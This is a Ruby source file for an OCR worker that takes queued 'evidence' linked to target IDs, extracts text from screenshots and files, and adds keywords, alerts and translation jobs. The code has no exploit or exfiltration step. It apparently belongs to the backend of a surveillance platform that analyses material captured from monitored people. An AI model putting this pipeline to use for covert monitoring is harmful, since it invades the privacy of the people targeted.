#
# OCR processing module
#
# the evidence to be processed are queued by the workers
#

require_relative 'leadtools'
require_relative 'tika'

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/sanitize'
require 'fileutils'

module RCS
module OCR

class Processor
  extend RCS::Tracer

  def self.run
    db = Mongoid.database
    coll = db.collection('ocr_queue')

    trace :info, "OCR ready to go..."

    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if entry = coll.find_and_modify({query: {flag: OCRQueue::QUEUED}, update: {"$set" => {flag: OCRQueue::PROCESSED}}})
        count = coll.find({flag: OCRQueue::QUEUED}).count()
        trace :info, "#{count} evidence to be processed in queue"
        process entry
      else
        #trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  end


  def self.process(entry)
    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])

    start = Time.now

    temp = RCS::DB::Config.instance.temp(ev[:data]['_grid'].to_s)
    output = temp + '.ocr'

    # dump the binary to the temp directory
    file = RCS::DB::GridFS.get ev[:data]['_grid'], entry['target_id']
    File.open(temp, 'wb') {|d| d.write file.read}
    size = File.size(temp)

    trace :debug, "#{ev.type.upcase}: #{temp} (#{size.to_s_bytes})"

    processed = false

    case ev.type
      when 'screenshot'
        # invoke the ocr on the temp file and get the result
        processed = LeadTools.transform(temp, output)
      when 'file'
        # invoke the text extractor on the temp file and get the result
        processed = Tika.transform(temp, output)
    end

    raise "unable to process" unless processed
    raise "output file not found" unless File.exist?(output)

    ocr_text = File.open(output, 'r') {|f| f.read}

    FileUtils.rm_rf temp
    FileUtils.rm_rf output

    # take a copy of evidence data (we need to do this to trigger the mongoid save)
    data = ev[:data].dup
    # remove invalid UTF-8 chars
    data[:body] = ocr_text.remove_invalid_chars

    # update the evidence with the new text
    ev[:data] = data
    ev[:kw] += ocr_text.keywords

    ev.save

    trace :info, "Evidence processed in #{Time.now - start} seconds - #{ev.type} #{size.to_s_bytes} -> text #{data[:body].size.to_s_bytes}"

    # check if there are matching alerts for this evidence
    RCS::DB::Alerting.new_evidence(ev)

    # add to the translation queue
    if $license['translation']
      TransQueue.add(entry['target_id'], ev._id)
    end

  rescue Exception => e
    trace :error, "Cannot process evidence: #{e.message}"
    trace :error, e.backtrace.join("\n")
    FileUtils.rm_rf temp
    FileUtils.rm_rf output
    #FileUtils.mv temp, temp + '.jpg'
    #exit!
  end


end

end #OCR::
end #RCS::